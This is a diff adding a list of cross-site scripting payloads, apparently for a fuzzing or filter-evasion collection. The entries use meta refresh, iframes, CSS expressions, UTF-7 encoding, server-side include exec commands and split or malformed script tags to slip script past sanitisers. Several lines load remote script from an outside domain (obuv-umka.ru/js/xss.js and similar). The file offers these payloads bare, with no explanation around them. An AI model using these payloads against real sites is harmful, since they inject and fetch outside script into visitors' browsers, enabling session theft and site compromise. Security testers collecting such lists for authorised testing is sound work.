@@ -1,1 +1,26 @@
-<IMG SRC=/ onerror=location.hash=\"10\"></img>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:location.hash=10;">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5sb2NhdGlvbi5oYXNoPTEwPC9zY3JpcHQ+">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:location.hash=10;">
+<IFRAME SRC="javascript:location.hash=10;"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:location.hash=10;"></FRAMESET>
+<TABLE BACKGROUND="javascript:location.hash=10">
+<TABLE><TD BACKGROUND="javascript:location.hash=10">
+<DIV STYLE="background-image: url(javascript:location.hash=10)">
+<DIV STYLE="background-image: url(&#1;javascript:location.hash=10)">
+<DIV STYLE="width: expression(location.hash=10);">
+<!--[if gte IE 4]><SCRIPT>location.hash=10;</SCRIPT><![endif]-->
+<BASE HREF="javascript:location.hash=10;//">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://www.obuv-umka.ru/js/xss.html"></OBJECT>
+a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);
+<SCRIPT SRC="http://www.obuv-umka.ru/js/xss.jpg"></SCRIPT>
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://obuv-umka.ru/js/xss.js></SCRIPT>'"-->
+<? echo('<SCR)';echo('IPT>location.hash=10</SCRIPT>'); ?>
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>location.hash=10</SCRIPT>">
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-location.hash=10;+ADw-/SCRIPT+AD4-
+<SCRIPT a=">" SRC="http://obuv-umka.ru/js/xss.js"></SCRIPT>
+<SCRIPT =">" SRC="http://obuv-umka.ru/js/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://obuv-umka.ru/js/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://obuv-umka.ru/js/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://obuv-umka.ru/js/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://obuv-umka.ru/js/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://obuv-umka.ru/js/xss.js"></SCRIPT>
